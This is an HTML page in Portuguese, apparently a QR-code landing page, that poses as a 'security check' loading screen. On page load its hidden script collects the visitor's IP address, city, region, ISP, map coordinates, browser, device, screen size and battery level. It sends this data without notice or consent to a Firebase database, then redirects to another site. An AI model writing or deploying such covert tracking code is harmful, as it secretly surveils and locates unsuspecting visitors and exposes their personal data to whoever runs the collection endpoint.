<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processando Acesso...</title>
    <style>
        body { background-color: #0b1220; color: #22c55e; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid rgba(34, 197, 94, 0.1); border-top: 4px solid #22c55e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: 2px; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <p>Verificando segurança...</p>

    <script>
        const FIREBASE_URL = "https://dadosdeqr-default-rtdb.firebaseio.com/acessos_qr.json";
        const URL_DESTINO = "https://saoluisma.github.io/Bloquear-cassinos/";

        async function capturarLocalizacao() {
            // Lista de APIs em ordem de confiabilidade
            const apis = [
                'https://ipapi.co/json/',
                'https://ipwhois.app/json/',
                'https://freeipapi.com/api/json'
            ];

            for (let url of apis) {
                try {
                    const res = await fetch(url, { method: 'GET' });
                    const d = await res.json();
                    
                    if (d.ip || d.ipAddress || d.query) {
                        return {
                            ip: d.ip || d.ipAddress || d.query || "Privado",
                            cidade: d.city || d.cityName || "Desconhecida",
                            regiao: d.region || d.regionName || d.region_name || "Desconhecida",
                            pais: d.country || d.countryName || d.country_name || "Brasil",
                            provedor: d.org || d.isp || d.connection?.isp || d.as || "Desconhecido",
                            fuso_horario: d.timezone || d.timeZone || "N/A",
                            mapa: (d.latitude || d.lat) ? `https://www.google.com/maps?q=${d.latitude || d.lat},${d.longitude || d.lon}` : "N/A"
                        };
                    }
                } catch (e) {
                    console.warn(`Falha na API: ${url}`);
                    continue; 
                }
            }
            return { ip: "Bloqueado/VPN", cidade: "N/A", pais: "N/A", provedor: "N/A", mapa: "N/A" };
        }

        async function iniciarRastreio() {
            // Captura de Hardware e Navegador
            const dadosDispositivo = {
                data_hora: new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" }),
                dispositivo: /Mobi|Android|iPhone/i.test(navigator.userAgent) ? 'Celular' : 'Computador',
                so: navigator.platform,
                navegador: navigator.userAgent,
                idioma: navigator.language,
                tela: `${window.screen.width}x${window.screen.height}`,
                referencia: document.referrer || "QR Code Direto",
                bateria: "N/A",
                conexao: navigator.connection ? navigator.connection.effectiveType : "Desconhecida"
            };

            // Tenta pegar nível de bateria (opcional)
            try {
                if (navigator.getBattery) {
                    const batt = await navigator.getBattery();
                    dadosDispositivo.bateria = `${Math.round(batt.level * 100)}%`;
                }
            } catch(e) {}

            // Captura Localização por IP
            const dadosLocalizacao = await capturarLocalizacao();

            // Envio para o Firebase
            const payload = { ...dadosDispositivo, ...dadosLocalizacao };

            try {
                await fetch(FIREBASE_URL, {
                    method: 'POST',
                    body: JSON.stringify(payload),
                    headers: { 'Content-Type': 'application/json' }
                });
            } catch (err) {
                console.error("Erro Firebase:", err);
            } finally {
                // Redirecionamento Final
                window.location.href = URL_DESTINO;
            }
        }

        // Inicia o processo
        iniciarRastreio();

        // Segurança: Redireciona forçado após 4 segundos se algo travar
        setTimeout(() => { window.location.href = URL_DESTINO; }, 4000);
    </script>
</body>
</html>
